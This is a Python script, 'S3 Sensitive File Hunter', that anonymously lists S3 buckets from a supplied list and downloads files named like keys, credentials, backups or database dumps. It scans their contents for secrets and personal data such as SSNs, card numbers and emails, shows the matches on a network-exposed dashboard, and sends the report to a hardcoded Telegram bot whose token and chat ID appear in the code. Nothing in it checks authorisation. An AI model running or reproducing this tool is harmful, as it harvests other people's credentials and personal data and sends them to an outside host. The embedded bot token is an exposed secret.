import subprocess
import os
import time
import signal
import PyPDF2
import docx
import requests
import re
import json
import math
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
from rich.prompt import Prompt
from flask import Flask, render_template_string
from threading import Thread
from concurrent.futures import ThreadPoolExecutor
import threading
import logging

# Silence Flask HTTP logs
logging.getLogger('werkzeug').setLevel(logging.ERROR)

# Telegram Bot Config
TELEGRAM_BOT_TOKEN = "7989737610:AAETWCJsp6BVS4zAgLfuuNWS_dqT7AIFLqA"
TELEGRAM_CHAT_ID = "1559885281"

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}
    requests.post(url, data=data)

def send_telegram_file(file_path):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
    with open(file_path, "rb") as f:
        data = {"chat_id": TELEGRAM_CHAT_ID}
        files = {"document": f}
        requests.post(url, data=data, files=files)

console = Console()

sensitive_extensions = re.compile(r'([^.]+)\.(zip|rar|tar|sql|db|sqlite|bak|backup|crt|key|pem|p12|ppk|log|cfg|env|yml|json|ini|passwd|sh|conf|pdf|docx|doc)$', re.IGNORECASE)

sensitive_filenames = [
    'id_rsa', 'id_rsa.pub', 'authorized_keys', 'config.json', 'config.yaml', 
    'database.sql', 'db_dump.sql', 'mongo_uri.txt', 'firebase_config.json',
    'secrets.yml', 'credentials.csv', 'aws-credentials', '.aws/credentials', 
    'passwords.txt', 'api_keys.json', 'gcloud_auth.json', 'azure_creds.json',
    '.env', 'vault-token', 'jwt_private_key.pem', 'auth.json', 'backup.zip', 
    'backup.tar.gz', 'dump.sql', 'private.key', 'root.pem', 'ssl-cert.pem', 
    'master.key', 'shadow.bak', 'htpasswd', 'passwd.bak', 'superuser.cfg', 
    '.bash_history', '.zsh_history', '.git-credentials', '.dockercfg', 's3cfg', 
    'mysql.cnf', 'pgpass.conf', 'exported-keys.p12'
]

security_keywords = [
    "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "DB_PASSWORD", "PRIVATE_KEY",
    "Authorization", "Bearer", "stripe_secret_key", "paypal_client_secret",
    "square_access_token", "admin_password", "root_password", "GOOGLE_CLOUD_KEY",
    "AZURE_STORAGE_KEY", "HEROKU_API_KEY", "DOCKER_CONFIG_AUTH", "NPM_TOKEN",
    "apikey", "credentials", "password", "token", "auth_token", "secret_key",
    "access_token", "refresh_token", "client_id", "client_secret", "api_secret",
    "session_key", "encryption_key", "master_password", "oauth_token",
    "database_pass", "ssh_key", "jwt_token", "login_key", "vault_key",
    "certificate", "passphrase", "security_token", "config_key", "private_token"
]

pii_keywords = [
    "name", "first_name", "last_name", "full_name", "username",
    "email", "email_address", "mail",
    "phone", "phone_number", "mobile", "telephone", "contact_number",
    "ssn", "social_security", "social_security_number",
    "account", "account_number", "bank_account", "credit_card", "card_number",
    "address", "city", "zip", "postal_code",
    "dob", "date_of_birth", "birthdate",
    "passport", "driver_license", "license_number",
    "tax_id", "tin", "national_id"
]

personal_identifiers = ["name", "first_name", "last_name", "full_name", "username", "ssn", "social_security", "social_security_number", 
                       "account", "account_number", "card_number", "passport", "driver_license", "license_number", "tax_id", "tin", "national_id"]
contact_identifiers = ["email", "email_address", "mail", "phone", "phone_number", "mobile", "telephone", "contact_number"]

regex_patterns = {
    "email": (re.compile(r'(?<!\w)[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}(?!\w)'), "pii"),
    "ssn_tax_id": (re.compile(r'(?<!\d)\d{3}[-.\s]\d{2}[-.\s]\d{4}(?!\d)'), "pii"),
    "credit_card": (re.compile(r'(?<!\d)(?:\d{4}[-.\s]){3}\d{3,4}|\d{15,16}(?!\d)'), "pii"),
    "phone_number": (re.compile(r'(?<!\d)(?:\+?\d{1,3}[-.\s])?(?:\d{3,4}[-.\s])\d{3,4}[-.\s]\d{4}(?!\d)'), "pii"),
    "api_key": (re.compile(r'(?<!\w)[A-Za-z0-9_-]{32,100}(?!\w)'), "security"),
}

def extract_text_from_file(file_path):
    try:
        if file_path.endswith(".pdf"):
            with open(file_path, "rb") as f:
                reader = PyPDF2.PdfReader(f)
                return " ".join([page.extract_text() for page in reader.pages if page.extract_text()])
        elif file_path.endswith(".docx"):
            doc = docx.Document(file_path)
            return " ".join([p.text for p in doc.paragraphs])
        elif file_path.endswith(".json") or file_path.endswith(".txt"):
            with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                return f.read()
    except Exception as e:
        console.print(f"[red][!] Error extracting text from {file_path}: {e}[/red]")
    return ""

def has_context(content, keyword, category):
    content_lower = content.lower()
    keyword_lower = keyword.lower()
    pattern = r'(?<!\w)' + re.escape(keyword_lower) + r'(?!\w)\s*[:=]\s*([^\s,]+)'
    matches = []
    for match in re.finditer(pattern, content_lower):
        value = match.group(1)[:20]
        matches.append((f"[{category}] {keyword_lower}: {value}", 75))
    return matches if matches else []

def calculate_entropy(value):
    if not value:
        return 0
    length = len(value)
    char_count = {}
    for char in value:
        char_count[char] = char_count.get(char, 0) + 1
    entropy = -sum((count / length) * math.log2(count / length) for count in char_count.values())
    return entropy

def check_regex_patterns(content):
    content_lower = content.lower()
    matches = []
    for pattern_name, (pattern, category) in regex_patterns.items():
        keyword_context = f"{pattern_name.lower()}\s*[:=]"
        has_keyword = re.search(keyword_context, content_lower) is not None
        for match in pattern.finditer(content_lower):
            value = match.group(0)
            if pattern_name in ["credit_card", "phone_number"]:
                digits = value.replace("-", "").replace(".", "").replace(" ", "")
                if not (10 <= len(digits) <= 15 if pattern_name == "phone_number" else len(digits) in [15, 16]):
                    continue
            if pattern_name == "api_key":
                if not re.search(r'[A-Za-z].*\d|\d.*[A-Za-z]', value) or calculate_entropy(value) < 3.5:
                    continue
            confidence = 95 if has_keyword else 85
            matches.append((f"[{category}] {pattern_name}: {value}", confidence))
    return matches

# Flask App for Real-Time Dashboard
app = Flask(__name__)
found_files = []
lock = threading.Lock()
false_positives = set()

if os.path.exists("false_positives.json"):
    with open("false_positives.json", "r") as f:
        false_positives.update(json.load(f))

@app.route('/')
def dashboard():
    with lock:
        return render_template_string("""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>S3 Sensitive File Hunter - Live Dashboard</title>
    <style>
        body { font-family: 'Courier New', monospace; background: linear-gradient(135deg, #1a1a1a, #2a2a2a); color: #fff; padding: 20px; }
        h1 { text-align: center; color: #00ffcc; text-shadow: 0 0 10px #00ffcc; }
        table { width: 90%; margin: 20px auto; border-collapse: collapse; box-shadow: 0 0 20px rgba(0,255,204,0.2); }
        th, td { padding: 15px; border: 1px solid #444; text-align: left; }
        th { background: #333; color: #00ffcc; text-transform: uppercase; }
        .high { background: rgba(231,67,32,0.1); color: #e74320; }
        .medium { background: rgba(231,146,32,0.1); color: #e79220; }
        a { color: #00ffcc; text-decoration: none; }
        a:hover { text-decoration: underline; }
    </style>
    <meta http-equiv="refresh" content="5">
</head>
<body>
    <h1>Live S3 Sensitive File Findings</h1>
    <table>
        <tr><th>URL</th><th>Risk Level</th><th>File Type</th><th>Disclosed Info</th><th>Hits</th><th>Confidence</th></tr>
        {% for url, risk_level, info in findings %}
            <tr class="{{ 'high' if risk_level == 'HIGH' else 'medium' }}">
                <td><a href="{{ url }}" target="_blank">{{ url }}</a></td>
                <td>{{ risk_level }}</td>
                <td>{{ info['file_type'] }}</td>
                <td>{{ info['matches']|join(', ') }}</td>
                <td>{{ info['hits'] }}</td>
                <td>{{ info['confidence'] }}%</td>
            </tr>
        {% endfor %}
    </table>
</body>
</html>
""", findings=found_files)

def run_flask():
    app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)

def scan_bucket(bucket, progress, task, scanned_files):
    global findings_count
    bucket_stats[bucket]['scanned'] += 1
    console.print(f"[bold green][+] Scanning bucket:[/bold green] {bucket}")
    command = f"aws s3 ls s3://{bucket} --recursive --no-sign-request"
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
        
        if result.returncode != 0 or not result.stdout or "AccessDenied" in result.stdout:
            console.print(f"[red][-] Access Denied or Empty Bucket: {bucket}[/red]")
            return
        
        for line in result.stdout.splitlines():
            file_path = line.split()[-1]
            full_url = f"https://{bucket}.s3.amazonaws.com/{file_path}"
            if full_url in scanned_files:
                continue
            
            if sensitive_extensions.search(file_path) or any(name in file_path.lower() for name in sensitive_filenames):
                temp_file = f"/tmp/{os.path.basename(file_path)}"
                download_command = f"aws s3 cp s3://{bucket}/{file_path} {temp_file} --no-sign-request"
                download_result = subprocess.run(download_command, shell=True, capture_output=True, text=True, timeout=30)
                
                if download_result.returncode != 0 or "AccessDenied" in download_result.stdout or "NoSuchKey" in download_result.stdout:
                    continue
                
                content = extract_text_from_file(temp_file)
                
                # Check all keywords and patterns
                all_keywords = security_keywords + pii_keywords + custom_keywords
                matches_with_confidence = []
                pii_matches = []
                personal_id_matches = []
                contact_matches = []
                security_matches = []
                hit_count = 0
                for keyword in security_keywords:
                    keyword_matches = has_context(content, keyword, "security")
                    security_matches.extend(keyword_matches)
                    hit_count += len(keyword_matches)
                for keyword in pii_keywords:
                    keyword_matches = has_context(content, keyword, "pii")
                    if keyword in personal_identifiers:
                        personal_id_matches.extend(keyword_matches)
                    elif keyword in contact_identifiers:
                        contact_matches.extend(keyword_matches)
                    else:
                        pii_matches.extend(keyword_matches)
                    hit_count += len(keyword_matches)
                for keyword in custom_keywords:
                    keyword_matches = has_context(content, keyword, "custom")
                    pii_matches.extend(keyword_matches)
                    hit_count += len(keyword_matches)
                
                regex_matches = check_regex_patterns(content)
                for match, conf in regex_matches:
                    if "[security]" in match:
                        security_matches.append((match, conf))
                    elif any(pid in match for pid in personal_identifiers):
                        personal_id_matches.append((match, conf))
                    elif any(cid in match for cid in contact_identifiers):
                        contact_matches.append((match, conf))
                    else:
                        pii_matches.append((match, conf))
                hit_count += len(regex_matches)
                
                # Smart linkage rule
                if security_matches:
                    matches_with_confidence = security_matches + personal_id_matches + contact_matches + pii_matches  # Security always flags
                elif personal_id_matches and (contact_matches or pii_matches):  # Personal ID + Contact or Other PII
                    matches_with_confidence = personal_id_matches + contact_matches + pii_matches
                
                if matches_with_confidence:
                    unique_matches = list(set(match[0] for match in matches_with_confidence if match[0] not in false_positives))
                    if not unique_matches:
                        os.remove(temp_file)
                        continue
                    avg_confidence = sum(conf for _, conf in matches_with_confidence) / len(matches_with_confidence) if matches_with_confidence else 0
                    risk_level = "HIGH" if security_matches else "MEDIUM"
                    file_ext = full_url.split('.')[-1].upper()
                    with lock:
                        findings_count += 1
                        bucket_stats[bucket][risk_level.lower()] += 1
                        entry = (full_url, risk_level, {
                            'matches': unique_matches,
                            'hits': len(unique_matches),
                            'confidence': round(avg_confidence),
                            'file_type': file_ext
                        })
                        found_files.append(entry)
                        scanned_files.add(full_url)
                        with open("scan_progress.json", "w") as f:
                            json.dump(list(scanned_files), f)
                        progress.update(task, description=f"Scanning Buckets: {progress.tasks[task].completed}/{len(buckets)}, Found: {findings_count}")
                        console.print(f"[bold red][!] Sensitive File Found: {risk_level} [/bold red]")
                        console.print(f"[yellow]Information Disclosed:[/yellow] {', '.join(unique_matches)}")
                        console.print(f"[blue]URL:[/blue] {full_url}")
                        console.print(f"[cyan]Hits:[/cyan] {len(unique_matches)}, Confidence: {round(avg_confidence)}%")
                        console.print("-" * 100 + "\n")
                
                os.remove(temp_file)
    
    except Exception as e:
        console.print(f"[red][!] Error scanning bucket {bucket}: {e}[/red]")

buckets_file = Prompt.ask("Enter the file containing valid S3 bucket names")
custom_keywords = Prompt.ask("Enter custom keywords (comma-separated, optional)", default="").split(",")
custom_keywords = [k.strip() for k in custom_keywords if k.strip()]
output_file = "sensitive_files_found.html"

if not os.path.exists(buckets_file):
    console.print("[bold red][!] Bucket list file not found! Exiting.[/bold red]")
    exit(1)

with open(buckets_file, "r") as f:
    buckets = [line.strip() for line in f if line.strip()]

console.print(Panel("[bold cyan]S3 Sensitive File Hunter[/bold cyan]"))
console.print(f"[bold yellow][*] Scanning {len(buckets)} buckets for sensitive files...[/bold yellow]\n")

bucket_stats = {bucket: {'high': 0, 'medium': 0, 'scanned': 0} for bucket in buckets}
start_time = time.time()
findings_count = 0
scanned_files = set()
if os.path.exists("scan_progress.json"):
    with open("scan_progress.json", "r") as f:
        scanned_files = set(json.load(f))
    console.print(f"[green][+] Resuming scan from {len(scanned_files)} files[/green]")

# Start Flask server in a separate thread
flask_thread = Thread(target=run_flask)
flask_thread.daemon = True
flask_thread.start()
console.print("[green][+] Live dashboard running at http://localhost:5000[/green]")

def signal_handler(sig, frame):
    console.print("\n[bold red][!] Scan interrupted. Saving results...[/bold red]")
    save_results()
    exit(0)

def save_results():
    if found_files:
        high_count = sum(1 for _, risk, _ in found_files if risk == "HIGH")
        medium_count = sum(1 for _, risk, _ in found_files if risk == "MEDIUM")
        preview_message = f"Found <b>{high_count}</b> HIGH, <b>{medium_count}</b> MEDIUM risks"
        send_telegram_message(preview_message)

        html_content = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>S3 Sensitive File Report</title>
    <style>
        body {{ font-family: 'Courier New', monospace; background: linear-gradient(135deg, #1a1a1a, #2a2a2a); color: #fff; padding: 20px; }}
        h1 {{ text-align: center; color: #00ffcc; text-shadow: 0 0 10px #00ffcc; }}
        table {{ width: 90%; margin: 20px auto; border-collapse: collapse; box-shadow: 0 0 20px rgba(0,255,204,0.2); }}
        th, td {{ padding: 15px; border: 1px solid #444; text-align: left; }}
        th {{ background: #333; color: #00ffcc; text-transform: uppercase; cursor: pointer; }}
        .high {{ background: rgba(231,67,32,0.1); color: #e74320; transition: all 0.3s; }}
        .high:hover {{ background: rgba(231,67,32,0.2); }}
        .medium {{ background: rgba(231,146,32,0.1); color: #e79220; transition: all 0.3s; }}
        .medium:hover {{ background: rgba(231,146,32,0.2); }}
        .file-type {{ padding: 5px; border-radius: 3px; margin-right: 5px; }}
        .pdf {{ background: #ff5555; }}
        .docx {{ background: #5555ff; }}
        .json {{ background: #55ff55; }}
        .txt {{ background: #ffff55; }}
        .other {{ background: #aaaaaa; }}
        .security {{ color: #ff5555; }}
        .pii {{ color: #55ff55; }}
        .custom {{ color: #ffff55; }}
        .footer {{ text-align: center; color: #00ffcc; font-style: italic; }}
        .footer a {{ color: #00ffcc; text-decoration: none; }}
        .footer a:hover {{ text-decoration: underline; }}
        a {{ color: #00ffcc; text-decoration: none; }}
        a:hover {{ text-decoration: underline; }}
    </style>
    <script>
        document.addEventListener('DOMContentLoaded', function() {{
            const table = document.querySelector('table');
            const headers = table.querySelectorAll('th');
            headers.forEach((header, index) => {{
                header.addEventListener('click', () => {{
                    const rows = Array.from(table.querySelectorAll('tr:not(:first-child)'));
                    const isAscending = header.classList.toggle('asc');
                    rows.sort((a, b) => {{
                        const aText = a.cells[index].textContent.trim();
                        const bText = b.cells[index].textContent.trim();
                        return isAscending ? aText.localeCompare(bText, undefined, {{numeric: true}}) : bText.localeCompare(aText, undefined, {{numeric: true}});
                    }});
                    rows.forEach(row => table.tBodies[0].appendChild(row));
                }});
            }});
        }});
    </script>
</head>
<body>
    <h1>S3 Sensitive File Findings</h1>
    <table>
        <tr><th>URL</th><th>Risk Level</th><th>File Type</th><th>Disclosed Info</th><th>Hits</th><th>Confidence</th></tr>
"""
        for url, risk_level, info in found_files:
            file_ext = url.split('.')[-1].lower()
            file_type_class = {'pdf': 'pdf', 'docx': 'docx', 'json': 'json', 'txt': 'txt'}.get(file_ext, 'other')
            disclosed_text = ", ".join(f"<span class='{m.split(']')[0][1:]}'>{m}</span>" for m in info['matches'])
            row_class = 'high' if risk_level == 'HIGH' else 'medium'
            html_content += f"""<tr class="{row_class}"><td><a href="{url}" target="_blank">{url}</a></td><td>{risk_level}</td><td><span class="file-type {file_type_class}">{file_ext.upper()}</span></td><td>{disclosed_text}</td><td>{info['hits']}</td><td>{info['confidence']}%</td></tr>"""

        html_content += """
    </table>
    <h2>Bucket Summary</h2>
    <table>
        <tr><th>Bucket</th><th>HIGH Risks</th><th>MEDIUM Risks</th><th>Files Scanned</th></tr>
"""
        for bucket, stats in bucket_stats.items():
            html_content += f"""<tr><td>{bucket}</td><td>{stats['high']}</td><td>{stats['medium']}</td><td>{stats['scanned']}</td></tr>"""

        html_content += """
    </table>
    <div class="footer">Crafted with 💖 by <a href="https://github.com/Atharv834/S3BucketMisconf" target="_blank">LordofHeaven</a></div>
</body></html>
"""
        with open(output_file, "w") as f:
            f.write(html_content)
        with open("false_positives.json", "w") as f:
            json.dump(list(false_positives), f)
        console.print(f"[green][+] Results saved to {output_file}[/green]")
        send_telegram_message("Sensitive files found! Report is being sent...")
        send_telegram_file(output_file)

signal.signal(signal.SIGINT, signal_handler)

with Progress(SpinnerColumn(), TextColumn("{task.description}"), BarColumn()) as progress:
    task = progress.add_task(f"Scanning Buckets: 0/{len(buckets)}, Found: 0", total=len(buckets))
    
    with ThreadPoolExecutor(max_workers=20) as executor:
        executor.map(lambda b: scan_bucket(b, progress, task, scanned_files), buckets)

save_results()
elapsed_time = time.time() - start_time
console.print(f"[bold cyan]Scan completed in {round(elapsed_time, 2)} seconds![/bold cyan]")
console.print("\n[bold cyan]Scan complete! Happy Hunting! ⚡[/bold cyan]")
